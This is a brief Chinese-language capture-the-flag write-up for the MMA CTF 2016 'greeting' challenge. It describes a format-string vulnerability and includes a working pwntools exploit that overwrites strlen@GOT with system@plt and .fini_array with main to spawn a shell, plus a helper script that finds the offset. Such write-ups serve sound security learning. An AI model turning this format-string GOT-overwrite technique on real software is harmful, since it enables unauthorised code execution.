# MMA CTF 2nd 2016 - Notes

## greeting

用 ida 可以看到裡面漏洞在 printf(&v5)

然後裡用有一個函數 nao() ，裡面有 system 

而 getline(buf, size) 裡面最後是 return strlen(buf)

所以可以改 strlen@got -> system@plt ，這樣buf 放 "sh" 就可以 get shell

然後改 .fini.array -> main 這樣可以執行第二次 Main

用 pwntools 的 fmtstr_payload 解

```python
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'

r = process('/tmp/pp/a')

r.recvrepeat(0.3)

# fmtstr_payload(7, {printf_got: system_add})  
system_plt = 0x8048490
strlen_got = 0x8049a54
main = 0x080485ed
fini_array = 0x8049934 # readelf -S 


offset =12
writes = {fini_array:main,strlen_got:system_plt}
padding = 'aa'
payload1 = padding + fmtstr_payload(offset = offset,writes = writes,numbwritten = 20,write_size='int')
r.sendline(payload1)
r.recvrepeat(0.2)
r.sendline('sh')
print "payload: ",payload1
r.interactive()
``` 

其他補充 - 找 offset 可以利用 pwntools

```
from pwn import *

def exec_fmt(payload):
    p = process('./a')
    p.recvrepeat(0.1)
    p.sendline(payload)
    return p.recv()
autofmt = FmtStr(exec_fmt)
print autofmt.offset
```

